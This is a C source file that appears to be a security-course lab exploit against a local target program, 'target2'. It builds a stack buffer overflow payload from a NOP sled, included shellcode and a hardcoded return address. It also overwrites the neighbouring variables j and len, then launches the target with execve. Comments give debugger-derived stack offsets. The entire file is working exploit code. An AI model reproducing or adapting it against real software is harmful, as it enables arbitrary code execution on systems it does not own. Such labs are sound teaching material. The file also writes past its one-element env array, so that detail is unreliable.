#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"
#define NOP 0x90
#define TARGET_ADDR 0x40a4fd50
#define SHELL_SIZE 45
#define RETURN_SPACE 16
#define BUFSIZE 283 //rip - buf = 0x40a4fe58 - 0x40a4fd40 = x118 = 280 bytes, 284 seg fault
#define CODE 264 //p &j - p &buf (inside foo) = 0x40a4fe48-0x40a4fd40 = x108 = 264 bytes

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char buf_overflow[BUFSIZE];
	int i;
	//fill buf_overflow with \x00 - initialize
	memset(buf_overflow, '\x00', BUFSIZE);
	
	char target_address[] = "\x50\xfd\xa4\x40";

	//fill 0-202 buf with NOP 
	for(i=0; i < CODE-SHELL_SIZE-RETURN_SPACE; i++)
		buf_overflow[i] = NOP;
	

	//fill 203-248 with shellcode
	for(i=CODE-SHELL_SIZE-RETURN_SPACE; i < CODE-RETURN_SPACE; i++)
		buf_overflow[i] = shellcode[i-CODE+SHELL_SIZE+RETURN_SPACE];
	
	//fill 248-256 with NOP
	for(i=CODE-RETURN_SPACE; i< CODE-8; i++)
		buf_overflow[i] = NOP;
	
	//fill 256-259 with Guessed return address
	for(i=0; i < 4; i++)  //256-259
		buf_overflow[CODE-8+i] = target_address[i];
	
	//fill 260-263 with NOP
	for(i=CODE-4; i < CODE; i++) //260-263
		buf_overflow[i] = NOP;

	//skip &j = 0x40a4fe48
	buf_overflow[CODE] = '\x0b';  //264
	buf_overflow[CODE+1] = '\x01';  //265
	buf_overflow[CODE+2] = NOP; //266
	buf_overflow[CODE+3] = NOP; //267

	//Overwrite len value to 283 at location p &len = 0x40a4fe4c
	buf_overflow[CODE+4] = '\x1b'; //268
	buf_overflow[CODE+5] = '\x01'; //269
	buf_overflow[CODE+6] = '\x00'; //270
	//buf_overflow[CODE+7] = '\x00'; //271
	

	args[0] = TARGET;
	args[1] = buf_overflow;
	args[2] = NULL;
	
	env[0] = NULL;
	//env[0] = &buf_overflow[270];
	env[1] = &buf_overflow[248]; //return addr at 256, 256-8 = 248 starting with NOP
	//env[2] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
